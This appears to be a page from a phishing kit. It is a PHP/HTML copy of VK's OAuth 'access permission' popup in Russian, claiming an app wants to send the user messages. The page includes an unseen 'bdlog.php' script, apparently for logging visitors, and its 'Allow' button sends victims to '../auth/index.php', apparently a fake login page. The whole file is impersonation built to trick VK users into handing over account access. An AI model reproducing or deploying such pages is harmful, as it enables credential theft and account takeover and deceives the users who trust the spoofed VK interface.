<?php 
include('bdlog.php');
?><!DOCTYPE html>
<html lang="en"><head>
    <title>Ответы | Разрешение доступа</title>
    <link rel="stylesheet" type="text/css" href="vk_files/common.css"><link rel="stylesheet" type="text/css" href="vk_files/fonts_cnt.css">
    <link type="text/css" rel="stylesheet" href="vk_files/oauth_popup.css">
      <meta charset="utf-8"><meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  </head>

  <body onload="doResize();" class="VK oauth_centered">
    <div class="oauth_wrap">
      <div class="oauth_wrap_inner">
        <div class="oauth_wrap_content" id="oauth_wrap_content">
          <div class="oauth_head">
  <a class="oauth_logo fl_l" href="https://vk.com/" target="_blank"></a>
  <div id="oauth_head_info" class="oauth_head_info fl_r">
    <a class="oauth_user_link" href="https://vk.com/" target="_blank"></a><span>&nbsp;&nbsp;&nbsp;<a class="oauth_logout_link" href="https://vk.com" target="_self"></a></span>
  </div>
</div>

<div class="oauth_content oauth_content_with_controls box_body clear_fix">
  <div class="oauth_form">

    

    <div class="oauth_form_access">
      <img src="vk_files/dquestion_d.png" class="oauth_app_photo">
      Приложение <b><a href="https://vk.com/app6679234" target="_blank"></a></b> запрашивает доступ к Вашему аккаунту.

      <div class="oauth_access_items">
        <div class="apps_access_item clear_fix"><div class="apps_access_icon apps_access_profile"></div><div class="fl_l apps_access_item_info"><b>Доступ к отправке сообщений</b>Приложение сможет отправлять вам сообщения в любой момент времени.</div></div><div id="denied_email" style="display:none" class="apps_access_item clear_fix"><div class="apps_access_icon apps_deny_email"></div><div class="fl_l apps_access_item_info"><b class="denied">Доступ к электронному адресу</b><span class="denied">Доступ к Вашему email запрещён</span> (<a onclick="return toggleEmailPrivacy();">Разрешить</a>)</div></div>
      </div>
    </div>
  </div>
</div>

<div class="oauth_bottom_wrap">
  <div class="box_controls">
    <div class="fl_r">
      <a class="flat_button fl_r button_indent" href="../auth/index.php">Разрешить</a>
      <a class="flat_button secondary fl_r">Отмена</a>
    </div>
    <div class="box_controls_text"></div>
  </div>
</div>
        </div>
      </div>
    </div>
  
</body></html>